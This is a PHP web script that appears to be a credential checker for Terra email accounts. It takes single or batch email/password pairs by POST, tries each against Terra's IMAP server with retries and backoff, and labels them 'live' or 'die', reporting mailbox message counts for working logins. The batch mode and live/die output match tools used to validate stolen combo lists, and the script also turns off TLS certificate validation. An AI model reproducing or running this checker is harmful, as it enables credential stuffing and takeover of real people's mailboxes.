<?php

class TerraValidator
{
    private array $config;

    public function __construct()
    {
        $this->config = [
            'imap_server' => getenv('IMAP_HOST') ?: 'imap.terra.com.br',
            'imap_port'   => (int)(getenv('IMAP_PORT') ?: 993),
            'timeout'     => (int)(getenv('IMAP_TIMEOUT') ?: 10), // Reduzido para 10s para falhar rápido
            'max_retries' => (int)(getenv('MAX_RETRIES') ?: 2),
        ];
    }

    /**
     * Valida credenciais IMAP com retry e timeout controlado.
     */
    public function validate(string $email, string $password): array
    {
        $attempt = 0;
        $last_error = '';
        $start_time = microtime(true);

        while ($attempt < $this->config['max_retries']) {
            $attempt++;
            
            try {
                $result = $this->attemptRealAuthentication($email, $password);
                
                if ($result['status'] === 'live') {
                    $elapsed = round((microtime(true) - $start_time) * 1000, 2);
                    $result['elapsed_ms'] = $elapsed;
                    $result['attempts'] = $attempt;
                    return $result;
                }

                $last_error = $result['message'];

                // Se for erro de credencial, não adianta retentar
                if (stripos($last_error, 'Invalid credentials') !== false || 
                    stripos($last_error, 'LOGIN failed') !== false ||
                    stripos($last_error, 'authentication failed') !== false) {
                    return [
                        'status' => 'die',
                        'email' => $email,
                        'reason' => 'invalid_credentials',
                        'message' => 'Invalid credentials',
                        'elapsed_ms' => round((microtime(true) - $start_time) * 1000, 2),
                        'timestamp' => date('Y-m-d H:i:s')
                    ];
                }

            } catch (Exception $e) {
                $last_error = $e->getMessage();
            }

            // Backoff exponencial apenas se houver tentativas restantes
            if ($attempt < $this->config['max_retries']) {
                usleep((int)(pow(2, $attempt - 1) * 500000)); // 0.5s, 1s...
            }
        }

        $elapsed = round((microtime(true) - $start_time) * 1000, 2);
        return [
            'status' => 'die',
            'email' => $email,
            'attempts' => $attempt,
            'last_error' => $last_error ?: 'Unknown connection error',
            'reason' => 'max_retries_exceeded',
            'elapsed_ms' => $elapsed,
            'timestamp' => date('Y-m-d H:i:s')
        ];
    }

    /**
     * Tenta conectar via IMAP SSL com configurações endurecidas.
     */
    private function attemptRealAuthentication(string $email, string $password): array
    {
        // Define timeout de socket globalmente para esta operação
        $original_timeout = ini_get('default_socket_timeout');
        ini_set('default_socket_timeout', $this->config['timeout']);

        $mailbox = sprintf(
            '{%s:%d/imap/ssl/novalidate-cert}', 
            $this->config['imap_server'], 
            $this->config['imap_port']
        );

        // OP_READONLY evita abrir a caixa de entrada, apenas autentica
        // 1 tentativa de reconexão interna do c-client
        $options = [
            'DISABLE_AUTHENTICATOR' => ['GSSAPI', 'NTLM'] // Desabilita auth complexas que falham sem Kerberos
        ];

        // Suprime warnings para não poluir output JSON
        $connection = @imap_open(
            $mailbox,
            $email,
            $password,
            OP_READONLY | OP_HALFOPEN, // HALFOPEN ajuda em alguns servidores a não selecionar INBOX imediatamente
            1,
            $options
        );

        // Restaura timeout original
        ini_set('default_socket_timeout', $original_timeout);

        if ($connection === false) {
            // Captura erros específicos do IMAP
            $errors = imap_errors();
            $error_msg = !empty($errors) ? end($errors) : 'Connection failed';
            
            // Limpa o stack de erros para não vazar para próximas chamadas
            imap_errors(); 

            return [
                'status' => 'die',
                'email' => $email,
                'message' => $error_msg,
                'error_detail' => $error_msg
            ];
        }

        // Se conectou, verifica status básico
        $check = imap_check($connection);
        $num_messages = $check ? $check->Nmsgs : 0;
        
        imap_close($connection, CL_EXPUNGE);

        return [
            'status' => 'live',
            'email' => $email,
            'message' => 'Autenticação bem-sucedida',
            'mailbox_messages' => $num_messages,
            'authenticated_at' => date('Y-m-d H:i:s')
        ];
    }

    /**
     * Valida múltiplas credenciais em lote.
     */
    public function validateBatch(array $credentials): array
    {
        $results = [];
        foreach ($credentials as $cred) {
            $email = $cred['email'] ?? '';
            $password = $cred['password'] ?? '';

            if (empty($email) || empty($password)) {
                $results[] = [
                    'email' => $email,
                    'status' => 'error',
                    'message' => 'Email ou senha ausentes'
                ];
                continue;
            }

            $results[] = $this->validate($email, $password);
        }

        return [
            'total' => count($results),
            'live' => count(array_filter($results, fn($r) => $r['status'] === 'live')),
            'die' => count(array_filter($results, fn($r) => $r['status'] === 'die')),
            'results' => $results,
            'timestamp' => date('Y-m-d H:i:s')
        ];
    }
}

// ============ EXECUÇÃO ============

header('Content-Type: application/json; charset=utf-8');

$input = $_POST;
if (empty($input) && isset($_SERVER['CONTENT_TYPE']) && str_contains($_SERVER['CONTENT_TYPE'], 'application/json')) {
    $rawInput = file_get_contents('php://input');
    $input = json_decode($rawInput, true) ?? [];
}

$email = $input['email'] ?? '';
$password = $input['password'] ?? '';
$batch = $input['batch'] ?? null;

try {
    if ($batch && is_array($batch)) {
        $validator = new TerraValidator();
        echo json_encode($validator->validateBatch($batch), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    } elseif (!empty($email) && !empty($password)) {
        $validator = new TerraValidator();
        echo json_encode($validator->validate($email, $password), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    } else {
        http_response_code(400);
        echo json_encode([
            'error' => 'Credenciais ausentes',
            'usage' => [
                'simple' => 'POST email=user@terra.com.br&password=senha123',
                'json' => 'POST {"email":"user@terra.com.br","password":"senha123"}',
                'batch' => 'POST {"batch":[{"email":"u1@t.com","password":"p1"},...]}'
            ]
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    }
} catch (Throwable $e) {
    http_response_code(500);
    echo json_encode(['error' => 'Internal Server Error', 'detail' => $e->getMessage()]);
}
